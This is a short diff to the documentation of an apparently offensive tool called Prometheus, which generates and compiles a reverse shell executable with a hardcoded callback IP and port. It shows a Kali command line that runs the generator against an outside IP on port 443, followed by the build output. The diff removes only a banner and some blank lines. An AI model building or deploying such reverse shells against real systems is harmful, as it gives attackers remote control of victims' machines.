@@ -7,22 +7,12 @@ Prometheus quickly generates and compiles a new reverse shell PE with a hardcode
 
 root@kali:/opt/Prometheus# ./prometheus.sh 78.55.64.3 443
 
-+----------------------------------------------------+
-|  Adversarial Informatics Weaponized C++ Rev Shell  |
-|               cygienesolutions.com                 |
-|        [Usage]: ./prometheus.sh <IP> <PORT>        |
-+----------------------------------------------------+
-
-
 Building Custom Reverse Shell Executable...
-
 
 Souce code complete...
 Compiling...
 
-
 Cleaning up...
-
 
 Done. 
 Support The Free Information Movement
